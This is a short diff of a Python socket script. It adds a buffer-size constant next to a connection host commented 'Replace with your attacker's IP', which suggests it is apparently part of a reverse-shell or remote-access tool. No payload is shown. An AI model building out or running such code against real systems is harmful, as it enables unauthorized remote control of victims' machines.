@@ -2,6 +2,7 @@ import socket
 
 CLIENT_HOST = "10.224.0.5"  # Replace with your attacker's IP
 CLIENT_PORT = 8888
+BUFFER_SIZE = 1024
 
 # Create a socket object
 s = socket.socket()
